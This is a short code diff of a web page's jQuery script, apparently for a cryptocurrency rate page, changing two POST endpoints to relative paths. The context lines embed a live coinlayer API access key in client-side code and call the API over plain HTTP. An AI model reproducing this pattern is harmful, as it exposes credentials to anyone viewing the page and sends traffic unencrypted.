@@ -62,6 +62,7 @@
 <script>
     $(function () {
         let rates = '';
+        var url      = window.location.href;
         $.ajax({
             url: 'http://api.coinlayer.com/api/live?access_key=b718b767e1946440d45eddf7f5edd0ae&symbols=BTC%2CETH%2CBCH%2CNEO%2CBAT%2CLINK%2CDOGE',
             type: 'GET',
@@ -115,7 +116,7 @@
                 $('#myID').focus();
             }else{
                 $.ajax({
-                    url: '/tt.php',
+                    url: 'tt.php',
                     type: 'POST',
                     data: {
                         data: yourArz,
@@ -131,7 +132,7 @@
 
         $('#myID').on('blur',function (){
             $.ajax({
-                url: '/ll.php',
+                url: 'll.php',
                 type: 'POST',
                 data: {
                     data: $(this).val()
